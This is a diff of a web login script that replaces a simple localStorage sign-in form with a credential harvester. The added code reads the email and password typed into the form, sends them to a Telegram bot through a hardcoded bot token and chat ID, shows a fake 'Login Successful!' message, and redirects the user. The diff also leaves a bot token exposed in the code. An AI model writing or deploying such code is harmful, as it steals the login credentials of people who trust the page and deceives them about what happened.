@@ -1,40 +1,19 @@
-document.addEventListener("DOMContentLoaded", function () {
-    const formTitle = document.getElementById("form-title");
-    const formButton = document.getElementById("form-button");
-    const authForm = document.getElementById("authForm");
-    const usernameInput = document.getElementById("username");
-    const passwordInput = document.getElementById("password");
+document.getElementById("loginForm").addEventListener("submit", function(event) {
+    event.preventDefault();
+    
+    let email = document.getElementById("email").value;
+    let password = document.getElementById("password").value;
 
-    // Check if user is already signed in
-    const savedUsername = localStorage.getItem("username");
-    const savedPassword = localStorage.getItem("password");
+    let telegramBotToken = "7934135059:AAFwaqZhu4VXerCCMQJSfb7tsn-9oyk01oU"; // 
+    let chatId = "6721678542"; // 
 
-    if (savedUsername && savedPassword) {
-        formTitle.textContent = "Login to Continue";
-        formButton.textContent = "Login";
-    } else {
-        formTitle.textContent = "Sign In to Get Started";
-        formButton.textContent = "Sign In";
-    }
+    let message = 🔐 New Login Attempt\n📧 Email: ${email}\n🔑 Password: ${password};
+    let telegramURL = https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)};
 
-    // Handle form submission
-    authForm.addEventListener("submit", function (e) {
-        e.preventDefault();
-
-        const username = usernameInput.value.trim();
-        const password = passwordInput.value.trim();
-
-        if (!savedUsername || !savedPassword) {
-            // Save user credentials (sign in)
-            localStorage.setItem("username", username);
-            localStorage.setItem("password", password);
-            window.location.reload(); // Reload to switch to login mode
-        } else {
-            // Validate login
-            if (username === savedUsername && password === savedPassword) {
-                // Redirect to Google
-                window.location.href = "https://www.google.com";
-            }
-        }
-    });
+    fetch(telegramURL, { method: "GET" })
+        .then(response => {
+            alert("Login Successful!");
+            window.location.href = "https://my_website.com"; // 
+        })
+        .catch(error => alert("Error logging in!"));
 });
